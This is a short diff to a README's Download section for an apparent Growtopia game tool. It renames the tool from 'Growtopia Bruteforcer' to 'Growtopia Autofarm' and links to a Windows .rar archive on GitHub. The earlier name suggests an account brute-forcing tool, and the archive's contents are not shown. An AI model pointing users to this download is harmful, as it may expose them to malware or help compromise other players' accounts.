@@ -37,7 +37,7 @@
 
 ## Download
 
-You can [download](https://github.com/maskstudios/growtopia-autofarm/releases/download/AutoFarm/GT.AutoFarm.rar) the latest installable version of Growtopia Bruteforcer for Windows.
+You can [DOWNLOAD](https://github.com/maskstudios/growtopia-autofarm/releases/download/AutoFarm/GT.AutoFarm.rar) the latest installable version of Growtopia Autofarm for Windows.
 
 ## Credits
 
